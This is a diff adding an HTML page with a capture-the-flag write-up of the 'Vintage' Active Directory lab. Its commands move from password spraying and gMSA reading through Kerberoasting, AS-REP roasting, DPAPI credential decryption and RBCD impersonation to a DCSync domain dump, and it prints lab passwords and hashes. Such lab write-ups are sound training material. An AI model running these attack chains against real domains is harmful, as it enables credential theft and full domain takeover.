@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Ups</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <ul class="nav-links">
+                <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="Write-up.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                <li><a href="#redteam"><i class="fas fa-user-secret"></i> Red Team</a></li>
+            </ul>
+        </nav>
+        <div class="contents">
+            <h1>Vintage Write-up</h1>
+            <div class="big-to-normal-image">
+                <img src="images/Vintage.png" alt="Vintage">
+            </div>
+            <p>This assumed breach CTF began with provided credentials for the user <code>P.Rosa</code>. Initial SMB authentication failed, so I modified the <code>krb5.conf</code> file to enable Kerberos authentication, which allowed me to obtain <code>P.Rosa’s</code> TGT.</p>
+            <p>Using LDAP enumeration, I gathered a list of usernames and performed a password spray using the format <code>username:username</code>, resulting in a successful login for a computer account. BloodHound revealed that this computer account had permissions to read a gMSA password from another computer account, which I used to obtain another user’s TGT.</p>
+            <p>With this new user, BloodHound showed <code>GenericWrite</code> privileges over a group that had <code>GenericAll</code> rights over three users. I added my user to the group, then performed a targeted Kerberoast attack. I successfully cracked the hash of <code>svc_sql</code>.</p>
+            <p>Although <code>svc_sql</code> was disabled, another password spray led to access as <code>n.neir</code>. I connected via WinRM and found DPAPI credentials, which allowed me to decrypt and recover credentials for <code>n.neir_adm</code>.</p>
+            <p>That account had <code>GenericWrite</code> on the DelegationAdmins group. I added <code>svc_sql</code> to that group, registered a fake SPN, and performed a Resource-Based Constrained Delegation (RBCD) attack to impersonate <code>L.bianchi_adm</code>. With this account’s TGS, I executed a DCSync attack, as <code>L.bianchi_adm</code> is a Domain Admin.</p>
+            <p>This granted full control of the domain, successfully compromising the Domain Controller.</p>
+            <h2>Enumeration</h2>
+            <h3> Nmap Scan</h3>
+            <div class="snippet">
+                <pre class="code-block">
+nmap -sV -sC -p- 10.10.11.45 -oN vintage.scan -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-12 20:05 PDT
+Nmap scan report for 10.10.11.45
+Host is up (0.16s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-13 03:07:48Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    |_http-server-header: Microsoft-HTTPAPI/2.0
+    |_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+52686/tcp open  msrpc         Microsoft Windows RPC
+52691/tcp open  msrpc         Microsoft Windows RPC
+52709/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+                    
+Host script results:
+    | smb2-time: 
+    |   date: 2025-03-13T03:08:41
+    |_  start_date: N/A
+    | smb2-security-mode: 
+    |   3:1:1: 
+    |_    Message signing enabled and required
+    |_clock-skew: -1s
+                    
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 262.72 seconds
+                </pre>
+            </div>
+            <h3>SMB</h3>
+            <p>As we can see smb says our user does not support it which could mean that we need to authenticate via kerberos.</p>
+            <img src="images/vintage-smb-error.png">
+            <p>Lets modify the <code>/etc/hosts</code> file and add</p>
+            <div class="snippet">
+                <pre class="code-block">
+dc01.vintage.htb vintage.htb
+                </pre>
+            </div>
+            <p>then within your <code>/etc/krb5.conf</code> file change it into this specific format</p>
+            <div class="snippet">
+                <pre class="code-block">
+[libdefaults]
+    default_realm = VINTAGE.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+    forwardable = true
+[realms]
+    VINTAGE.HTB = {
+        kdc = vintage.htb
+        admin_server = vintage.htb
+    }
+
+[domain_realm]
+    .vintage.htb = VINTAGE.HTB
+    vintage.htb = VINTAGE.HTB
+                </pre>
+            </div>
+            <p>Now lets get <code>P.Rosa</code> Ticket Granting Ticket (TGT)</p>
+            <div class="snippet">
+                <pre class="code-block">
+impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123
+
+export KRB5CCNAME=P.Rosa.ccache
+                </pre>
+            </div>
+            <p>Now we should be able to run netexec with no issues.</p>
+            <div class="snippet">
+                <pre class="code-block">
+netexec smb 'dc01.vintage.htb' -u P.Rosa -p Rosaisbest123 -k
+                </pre>
+            </div>
+            <img src="images/vintage-smb-fixed.png">
+            <h3>Username gathering</h3>
+            <p>We can query from ldap and get the usernames and more information within the AD.</p>
+            <div class="snippet">
+                <pre class="code-block">
+ldapsearch -H ldap://vintage.htb -D 'P.Rosa@vintage.htb' -w 'Rosaisbest123' -b "DC=vintage,DC=htb" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf
+                </pre>
+            </div>
+            <p>This will display all users within the domain and show the <code>samaccountname</code> and <code>memberof</code>. </p>
+            <img src="images/Vintage-username-info.png">
+            <p>We can see there are normal users as well as computer users. I will get all the <code>sam account</code> into a username.txt file and all the <code>cn</code> into a password.txt file as well the sam account name into the password.txt file.</p>
+            <div class="snippet">
+                <pre class="code-block">
+# usernames into a file
+
+ldapsearch -H ldap://vintage.htb -D 'P.Rosa@vintage.htb' -w 'Rosaisbest123' -b "DC=vintage,DC=htb" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName" | awk -F ':' '{print $2}' > users.txt
+
+
+# CNs into a password file
+
+ldapsearch -H ldap://vintage.htb -D 'P.Rosa@vintage.htb' -w 'Rosaisbest123' -b "DC=vintage,DC=htb" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName memberOf | grep "dn" | awk -F '=' '{print $2}' | awk -F ',' '{print $1}' > pass.txt
+
+# sAMAccountName into a password file
+
+ldapsearch -H ldap://vintage.htb -D 'P.Rosa@vintage.htb' -w 'Rosaisbest123' -b "DC=vintage,DC=htb" -b "DC=vintage,DC=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName" | awk -F ':' '{print $2}' >> pass.txt
+                </pre>
+            </div>
+            <p>With that we can do a password spray with their own usernames and see if there is a hit.</p>
+            <div class="snippet">
+                <pre class="code-block">
+Dont forget to remove the samaccountname from the users.txt file 
+                </pre>
+            </div>
+            <div class="snippet">
+                <pre class="code-block">
+netexec smb 'dc01.vintage.htb' -u users.txt -p pass.txt -k --no-bruteforce
+                </pre>
+            </div>
+            <img src="images/vintage-password-spray.png">
+            <p>We got a hit and it is a computer user: <code>FS01$</code>. Lets get that TGT.</p>
+            <div class="snippet">
+                <pre class="code-block">
+impacket-getTGT vintage.htb/FS01$:fs01
+
+export KRB5CCNAME=FS01\$.ccache
+                </pre>
+            </div>
+            <p>Now lets run bloodhound.</p>
+            <div class="snippet">
+                <pre class="code-block">
+bloodhound-python -c All -u fs01$ -p fs01 -d vintage.htb -ns 10.10.11.45 --zip
+                </pre>
+            </div>
+            <img src="images/Vintage-bloodhound.png">
+            <p>The user <code>FS01$</code> can read the gMSA (group managed service accounts) password of the account <code>GMSA01$</code>.</p>
+            <div class="snippet">
+                <pre class="code-block">
+bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword
+                </pre>
+            </div>
+            <div class="small-to-big-image">
+                <img src="images/vintage-readgmsa.png">
+                <img src="images/vintage-gmsa01.png">
+            </div>
+            <p>Now we can get the TGT for that <code>GMSA01$</code>.</p>
+            <div class="snippet">
+                <pre class="code-block">
+impacket-getTGT vintage.htb/'gmsa01$' -hashes aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
+
+export KRB5CCNAME=gmsa01\$.ccache
+                </pre>
+            </div>
+            <img src="images/vintage-gmsa01-TGT.png">
+            <h2>FootHold</h2>
+            <p>In bloodhound the user has <code>addself</code> and <code>GenericWrite</code> privileges over <code>ServiceManagers</code> group.</p>
+            <img src="images/vintage-gmsa01-bloodhound.png">
+            <p>Within the service manager group has <code>GenericAll</code> rights over these service accounts.</p>
+            <img src="images/vintage-servicemanagers-priv.png">
+            <p>The plan is to add ourselves to the group and do a targeted kerberoast attack on those specific users and see whos hash we can possibly attack.Lets add ourselves to the group.</p>
+            <p>What is targeted Kerberoast? It's when controlling an object that has a GenericAll, GenericWrite, WriteProperty or Validated-SPN over the target then attacker can add an SPN (ServicePrincipalName) to that account. Once the account has an SPN, it becomes vulnerable to Kerberoasting.</p>
+            <div class="snippet">
+                <pre class="code-block">
+bloodyAD --host "dc01.vintage.htb" -d "vintage.htb" --dc-ip 10.10.11.45 -k add groupMember "SERVICEMANAGERS" "gmsa01$"
+                </pre>
+            </div>
+            <img src="images/vintage-add-member-servicemanagers.png">
+            <p>Now we can do a targeted kerberoast attack.</p>
+            <div class="snippet">
+                <pre class="code-block">
+python3 targetedKerberoast.py --dc-host dc01.vintage.htb -d vintage.htb -u 'gmsa01$' -H 'aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339' --dc-ip 10.10.11.45 -k
+                </pre>
+            </div>
+            <div class="small-to-big-image">
+                <img src="images/vintage-targeted-kerberoast.png">
+            </div>
+            <p>We only manage to get 2/3 users which we missing <code>svc_sql</code> We can use bloodyAD to manually set up the ASREP and call it again.</p>
+            <div class="snippet">
+                <pre class="code-block">
+bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
+                </pre>
+            </div>
+            <img src="images/vintage-set-asrep">
+            <div class="snippet">
+                <pre class="code-block">
+bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
+                </pre>
+            </div>
+            <img src="images/vintage-sql-disable.png">
+            <div class="snippet">
+                <pre class="code-block">
+impacket-GetNPUsers vintage.htb/ -request -usersfile users.txt -format hashcat
+                </pre>
+            </div>
+            <div class="small-to-big-image">
+                <img src="images/vintage-ASRep-svc_sql.png">
+            </div>
+            <p>It only manage to crack <code>svc_sql</code> hash</p>
+            <div class="snippet">
+                <pre class="code-block">
+$krb5asrep$23$svc_sql@VINTAGE.HTB:ffcee10e2445cda48993c75a18071b39$beee6351859b747ac43f9868e4f8bda2f1c004d0f3814e4d2cdfe3081ff2e3de24f6ec73143b57be6dda4192d1ec07273f12f6108a944b0d9731ae96260744b6c0a95210632f87ec03be4aecc95111c6d19c37f8c5f9fb3104023cc725cfe99c3a9dd6fe3e66612223f944a468fce5127f9e528b12db4656957d59e1dc9760f59c9fa5b1165f4c970cc0f7f1d6232c349c74c35c7b455b3d29f78af5c43e1746621644dfe2e72385dae2121608fdfe3379efabd76479d23859b78872e688b8ffb2f0284ef027457f369ed0a21503bfee93de6a79727ec134ce63ef7198c68409a96ee92915b862c83c70:Zer0the0ne
+                </pre>
+            </div>
+            <p>I did a password spray attack since getting the TGT with the <code>svc_sql</code> is disabled.</p>
+            <div class="snippet">
+                <pre class="code-block">
+netexec smb 'dc01.vintage.htb' -u users.txt -p Zer0the0ne -k
+                </pre>
+            </div>
+            <p>Lets get the TGT!</p>
+            <div class="snippet">
+                <pre class="code-block">
+impacket-getTGT vintage.htb/C.Neri:Zer0the0ne
+
+export KRB5CCNAME=C.Neri.ccache
+                </pre>
+            </div>
+            <p>Since the user is apart of the remote management group we can winrm.</p>
+            <div class="snippet">
+                <pre class="code-block">
+evil-winrm -i dc01.vintage.htb -r vintage.htb
+                </pre>
+            </div>
+            <h2>Privilege Escalation</h2>
+            <p>There is anti virus enabled which threw me off. After reviewing the <code>AppData</code> directory, there is a folder called <code>Vault</code> that stores user credential data. This data is protected using <code>DPAPI (Data Protection API)</code>, which Windows uses to encrypt sensitive information such as stored credentials.</p>
+            <div class="big-to-normal-image">
+                <img src="images/vintage-dpapi-found.png">
+            </div>
+            <p>We can attempt to decrypt the user's credential files. First, we need to obtain the user's credentials, as DPAPI ties the encryption keys to the user's logon password or security context.</p>
+            <div class="snippet">
+                <pre class="code-block">
+Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials" -Force
+                </pre>
+            </div>
+            <img src="images/vintage-dpapi-credential.png">
+        </div>
+        <p>Next, we need to retrieve the DPAPI master keys. These are stored in the user's Protect directory:</p>
+        <div class="snippet">
+            <pre class="code-block">
+Get-ChildItem "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect" -Force -Recurse
+            </pre>
+        </div>
+        <p>The files in this directory contain the encrypted master keys that DPAPI uses to protect sensitive data like credentials. These master keys are themselves encrypted with the user's password-derived key (or system key if protected by machine context).</p>
+        <img src="images/vintage-dpapi-master-keys.png">
+        <p>There are two master key files located in the user's DPAPI Protect folder. The full path looks like this:</p>
+        <div class="snippet">
+            <pre class="code-block">
+# Path to the directory
+
+C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115
+            </pre>
+        </div>
+        <p>This folder is named after the user's Security Identifier (SID), and it contains the encrypted DPAPI master keys. These files are hidden and system-protected, so they won’t appear unless we change their attributes. To unhide them, run:</p>
+        <div class="snippet">
+            <pre class="code-block">
+attrib -s -h *.* /s
+            </pre>
+        </div>
+        <img src="images/vintage-unhide-creds.png">
+        <div class="snippet">
+            <pre class="code-block">
+download 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
+
+download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
+            </pre>
+        </div>
+        <p>Also download the credential file.</p>
+        <div class="snippet">
+            <pre class="code-block">
+# Path to credential file
+
+cd C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
+            </pre>
+        </div>
+        <p>Unhide it then proceed to download the file</p>
+        <p>Once that is done we can use impacket dpapi to decrypt the master keys.</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-dpapi masterkey -file "4dbf04d8-529b-4b4c-b4ae-8e875e4fe847" -sid "S-1-5-21-4024337825-2033394866-2055507597-1115" -password Zer0the0ne
+impacket-dpapi masterkey -file "99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" -sid "S-1-5-21-4024337825-2033394866-2055507597-1115" -password Zer0the0ne
+            </pre>
+        </div>
+        <img src="images/vintage-decrypt-dpapi-master-key.png">
+        <p>Now that we have the decrypted master key, we can attempt to decrypt the credential files.</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-dpapi credential -file "C4BB96844A5C9DD45D5B6A9859252BA6" -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
+            </pre>
+        </div>
+        <img src="images/vintage-decrypted-dpapi-creds.png">
+        <p>As you can see we got one of the users. In bloodhound we can see that the user has <code>Generic Writes</code> over the <code>Delegation Admins</code> group which within that group also has a user <code>L.BIANCHI_ADM</code> which has <code>DC Sync</code> rights over the domain.</p>
+        <img src="images/vintage-bloodhound-output2.png">
+        <img src="images/vintage-bloodhound-output3.png">
+        <p>We will perform a resource based constrained delegation attack. We can see our user does not have a SPN which the attack wont work.</p>
+        <div class="snippet">
+            <pre class="code-block">
+Get-ADUser -Identity C.Neri_adm -Properties ServicePrincipalName | Select-Object Name, ServicePrincipalName
+            </pre>
+        </div>
+        <img src="images/vintage-spn-check.png">
+        <p>Lets first make the <code>svc_sql</code> account active.</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-getTGT vintage.htb/'gmsa01$' -hashes aad3b435b51404eeaad3b435b51404ee:51434c5b357ff89c5f85d994a27f7339
+
+export KRB5CCNAME=gmsa01\$.ccache
+            </pre>
+        </div>
+        <p>Then to make it active.</p>
+        <div class="snippet">
+            <pre class="code-block">
+bloodyAD --host dc01.vintage.htb -d VINTAGE.HTB --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE
+            </pre>
+        </div>
+        <img src="images/vintage-acc-enable.png">
+        <p>Now add the user to the group.</p>
+        <div class="snippet">
+            <pre class="code-block">
+bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
+            </pre>
+        </div>
+        <img src="images/vintage-add-user-group.png">
+        <p>Now set up a fake spn on the user.</p>
+        <div class="snippet">
+            <pre class="code-block">
+export KRB5CCNAME=gmsa01\$.ccache
+
+bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -k set object "SVC_SQL" servicePrincipalName -v "cifs/fake"
+            </pre>
+        </div>
+        <img src="images/vintage-set-fake-spn.png">
+        <p>Then request a TGT of that user.</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-getTGT vintage.htb/svc_sql:Zer0the0ne
+
+export KRB5CCNAME=svc_sql.ccache
+            </pre>
+        </div>
+        <p>Now we need to request a service ticket impersonating the <code>L.BIANCHI_ADM</code>.</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne' -debug
+
+export KRB5CCNAME=L.BIANCHI_ADM.ccache
+            </pre>
+        </div>
+        <img src="images/vintage-RBCD-impersonate.png">
+        <p>Now once we imported the <code>ccache</code> file we can dump the domain</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-secretsdump -k dc01.vintage.htb
+            </pre>
+        </div>
+        <img src="images/vintage-domain-dump.png">
+        <p>And as well since we are impersonating the user who is apart of domain admins group we are basically administrator's in any computer.</p>
+        <div class="snippet">
+            <pre class="code-block">
+impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
+            </pre>
+        </div>
+        <img src="images/vintage-pwn.png">
+    </div>
+</body>
+</html>
